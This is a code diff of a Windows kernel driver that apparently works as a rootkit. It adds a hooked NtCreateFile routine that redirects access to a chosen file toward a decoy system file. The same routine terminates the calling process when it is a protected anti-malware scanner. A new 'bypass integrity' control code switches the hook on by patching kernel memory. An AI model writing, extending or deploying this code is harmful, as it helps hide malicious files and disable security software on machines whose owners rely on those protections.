@@ -48,11 +48,137 @@ typedef struct x_hooklist {
 
     int pID;
     wchar_t filename[MAX_PATH];
+    UNICODE_STRING decoyFile;
+
 
 }hooklist, * Phooklist;
 
 hooklist xHooklist;
 exprocess_offsets eoffsets;
+
+NTSTATUS WINAPI FakeNtCreateFile2(
+    PHANDLE            FileHandle,
+    ACCESS_MASK        DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    PIO_STATUS_BLOCK   IoStatusBlock,
+    PLARGE_INTEGER     AllocationSize,
+    ULONG              FileAttributes,
+    ULONG              ShareAccess,
+    ULONG              CreateDisposition,
+    ULONG              CreateOptions,
+    PVOID              EaBuffer,
+    ULONG              EaLength
+) {
+    NTSTATUS status = STATUS_UNSUCCESSFUL; 
+    int requestorPid = 0x0;
+    KMUTEX Mutex;
+    KeInitializeMutex(&Mutex, 0);
+    KeWaitForSingleObject(&Mutex, Executive, ExGetPreviousMode(), FALSE, NULL);
+
+    __try
+    {
+
+        __try {
+
+            if (ObjectAttributes &&
+                ObjectAttributes->ObjectName &&
+                ObjectAttributes->ObjectName->Buffer) {
+
+                // Check if the filename matches the hook list
+                if (wcsstr(ObjectAttributes->ObjectName->Buffer, xHooklist.filename) && !wcsstr(ObjectAttributes->ObjectName->Buffer, L".lnk")) {
+
+                    PVOID process = NULL;
+
+                    NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)PsGetCurrentProcessId(), &process);
+
+                    if (ret != STATUS_SUCCESS)
+                    {
+                        if (ret == STATUS_INVALID_PARAMETER)
+                        {
+                            DbgPrint("the process ID was not found.");
+                        }
+                        if (ret == STATUS_INVALID_CID)
+                        {
+                            DbgPrint("the specified client ID is not valid.");
+                        }
+                        return (-1);
+                    }
+
+                    RtlCopyUnicodeString(ObjectAttributes->ObjectName, &xHooklist.decoyFile);
+
+                    ObjectAttributes->ObjectName->Length = xHooklist.decoyFile.Length;
+                    ObjectAttributes->ObjectName->MaximumLength = xHooklist.decoyFile.MaximumLength;
+
+
+                    ULONG_PTR EProtectionLevel = (ULONG_PTR)process + eoffsets.protection_offset;
+
+                    ObDereferenceObject(process);
+
+                    if (*(BYTE*)EProtectionLevel == global_protection_levels.PS_PROTECTED_ANTIMALWARE_LIGHT)
+                    {
+                        DbgPrint("anti-malware trying to scan it!!\n");
+
+                        NTSTATUS status = ZwTerminateProcess(NtCurrentProcess(), STATUS_SUCCESS);
+                        if (!NT_SUCCESS(status)) {
+                            DbgPrint("Failed to terminate the anti-malware: %08X\n", status);
+                        }
+                        else {
+                            DbgPrint("anti-malware terminated successfully.\n");
+                        }
+                    }
+                    status = IoCreateFile(
+                        FileHandle,
+                        DesiredAccess,
+                        ObjectAttributes,
+                        IoStatusBlock,
+                        AllocationSize,
+                        FileAttributes,
+                        ShareAccess,
+                        CreateDisposition,
+                        CreateOptions,
+                        EaBuffer,
+                        EaLength,
+                        CreateFileTypeNone,
+                        (PVOID)NULL,
+                        0
+                    );
+
+                    return status;
+                }
+            }
+
+            status = IoCreateFile(
+                FileHandle,
+                DesiredAccess,
+                ObjectAttributes,
+                IoStatusBlock,
+                AllocationSize,
+                FileAttributes,
+                ShareAccess,
+                CreateDisposition,
+                CreateOptions,
+                EaBuffer,
+                EaLength,
+                CreateFileTypeNone,
+                (PVOID)NULL,
+                0
+            );
+
+            return status;
+        }
+        __except (GetExceptionCode() == STATUS_ACCESS_VIOLATION ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) {
+            DbgPrint("An issue occurred while hooking NtCreateFile (Hook Removed) (%08X) \n", GetExceptionCode());
+
+            write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFileOrigin, sizeof(xHooklist.NtCreateFileOrigin));
+        }
+    }
+    __finally {
+        KeReleaseMutex(&Mutex, 0);
+    }
+
+    return status;
+}
+
 
 NTSTATUS WINAPI FakeNtCreateFile(
     PHANDLE            FileHandle,
@@ -71,7 +197,7 @@ NTSTATUS WINAPI FakeNtCreateFile(
 
     KMUTEX Mutex;
     KeInitializeMutex(&Mutex, 0);
-    KeWaitForSingleObject(&Mutex, Executive, KernelMode, FALSE, NULL);
+    KeWaitForSingleObject(&Mutex, Executive, ExGetPreviousMode(), FALSE, NULL);
 
     int requestorPid = 0x0;
 
@@ -134,23 +260,39 @@ NTSTATUS WINAPI FakeNtCreateFile(
     }
 }
 
-DWORD initializehooklist(Phooklist hooklist_s, fopera rfileinfo)
+DWORD initializehooklist(Phooklist hooklist_s, fopera rfileinfo, int Option)
 {
-    if (!hooklist_s || !rfileinfo.filename || !rfileinfo.rpid)
+    if (!hooklist_s || !rfileinfo.filename || (!rfileinfo.rpid && Option == 1) )
     {
         DbgPrint("invalid structure provided \n");
         return (-1);
 
     }
 
-    if (hooklist_s->NtCreateFileAddress)
+    if (hooklist_s->NtCreateFileAddress && Option == 1)
     {
         DbgPrint("Hook already active \n");
         return (-1);
     }
+
+    if (hooklist_s->NtCreateFileAddress && Option == 2)
+    {
+
+        DbgPrint("Hook already active for NtCreateFile \n");
+
+        if (hooklist_s->NtCreateFileHookAddress != (uintptr_t*)&FakeNtCreateFile2)
+        {
+            DbgPrint("unhooking ... \n");
+
+            write_to_read_only_memory(xHooklist.NtCreateFileAddress, &xHooklist.NtCreateFileOrigin, sizeof(xHooklist.NtCreateFileOrigin));
+        }
+    }
+
     UNICODE_STRING NtCreateFile_STRING = RTL_CONSTANT_STRING(L"NtCreateFile");
 
     UNICODE_STRING NtOpenFile_STRING = RTL_CONSTANT_STRING(L"NtOpenFile");
+
+    RtlInitUnicodeString(&hooklist_s->decoyFile, L"\\SystemRoot\\System32\\ntoskrnl.exe");
 
     hooklist_s->NtCreateFileAddress = MmGetSystemRoutineAddress(&NtCreateFile_STRING);
 
@@ -190,7 +332,11 @@ DWORD initializehooklist(Phooklist hooklist_s, fopera rfileinfo)
 
     DbgPrint("NtOpenFile resolved\n");
 
-    hooklist_s->NtCreateFileHookAddress = (uintptr_t)&FakeNtCreateFile;
+    if (Option == 1)
+        hooklist_s->NtCreateFileHookAddress = (uintptr_t)&FakeNtCreateFile;
+    else if (Option == 2)
+        hooklist_s->NtCreateFileHookAddress = (uintptr_t)&FakeNtCreateFile2;
+    
 
     memcpy(hooklist_s->NtCreateFilePatch + 2, &hooklist_s->NtCreateFileHookAddress, sizeof(void*));
 
@@ -612,10 +758,25 @@ NTSTATUS processIoctlRequest(
                 }
                 fopera rfileinfo = { 0 };
                 RtlCopyMemory(&rfileinfo, Irp->AssociatedIrp.SystemBuffer, sizeof(rfileinfo));
-                pstatus = initializehooklist(&xHooklist, rfileinfo);
+                pstatus = initializehooklist(&xHooklist, rfileinfo,1);
 
 
-                DbgPrint("Process Protection changed to Windows ");
+                DbgPrint("File access restricted ");
+                break;
+            }
+            case BYPASS_INTEGRITY_FILE_CTL:
+            {
+                if (pstack->Parameters.DeviceIoControl.InputBufferLength < sizeof(fopera))
+                {
+                    pstatus = STATUS_BUFFER_TOO_SMALL;
+                    break;
+                }
+                fopera rfileinfo = { 0 };
+                RtlCopyMemory(&rfileinfo, Irp->AssociatedIrp.SystemBuffer, sizeof(rfileinfo));
+
+                pstatus = initializehooklist(&xHooklist, rfileinfo,2);
+
+                DbgPrint("bypass integrity check ");
                 break;
             }
             case PROTECTION_LEVEL_LSA_LIGHT:
